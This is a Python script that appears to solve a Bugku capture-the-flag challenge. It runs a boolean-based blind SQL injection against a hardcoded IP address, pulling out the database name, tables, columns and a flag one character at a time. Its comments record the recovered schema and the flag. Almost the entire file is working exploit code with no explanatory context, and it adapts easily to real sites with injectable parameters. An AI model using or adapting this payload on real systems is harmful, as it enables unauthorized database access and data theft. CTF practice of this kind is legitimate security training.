import requests

url= "http://123.206.87.240:9004/Once_More.php?"
meta_word = "abcdefghijklmnopqrstuvwxyz0123456789,_{@#$%&*}-+"

def do_length():
    for i in range(0, 50):
        # playload = "id=0' or (select length(database())={0}) or '1'='2".format(i)
        # 9
        #playload = "id=0' or (select length((select group_concat(table_name) from information_schema.tables where table_schema='web1002-2'))={0}) or '1'='2".format(i)
        # 11
        # playload = "id=0' or (select length((select group_concat(column_name) from information_schema.columns where table_name='flag2'))={0}) or '1'='2".format(i)
        # 13
        # playload = "id=0' or (select length((select group_concat(flag2) from flag2))={0}) or '1'='2".format(i)
        # 28
        playload = "id=0' or (select length((select group_concat(address) from flag2))={0}) or '1'='2".format(i)
        #  14
        res = requests.get(url+playload)
        if res.text.find("Hello,I Am Here!") != -1:
            print(i)
            exit(1)


def do_name():
    last_result = ""
    for index in range(1, 15):
        for char in meta_word:
            # playload = "id=0' or (select mid(database(), {0}, 1)='{1}') or '1'='2".format(index, char)
            # database = web1002-2
            #playload = "id=0' or (select mid((select group_concat(table_name) from information_schema.tables where table_schema='web1002-2'),{0},1)='{1}') or '1'='2".format(index, char)
            # tables = class,flag2
            # playload = "id=0' or (select mid((select group_concat(column_name) from information_schema.columns where table_name='flag2'),{0},1)='{1}') or '1'='2".format(index, char)
            # column= flag2,address
            # playload = "id=0' or (select mid((select group_concat(flag2) from flag2),{0},1)='{1}') or '1'='2".format(index, char)
            # flag{bugku-sql_6s-2i-4t-bug}
            playload = "id=0' or (select mid((select group_concat(address) from flag2),{0},1)='{1}') or '1'='2".format(index, char)
            res = requests.get(url+playload)
            if res.text.find("Hello,I Am Here!") != -1:
                last_result+= char
                print(char)
                break
        print("no. {0}".format(index))
    print(last_result)

if __name__ == "__main__":
    # do_length()
    do_name()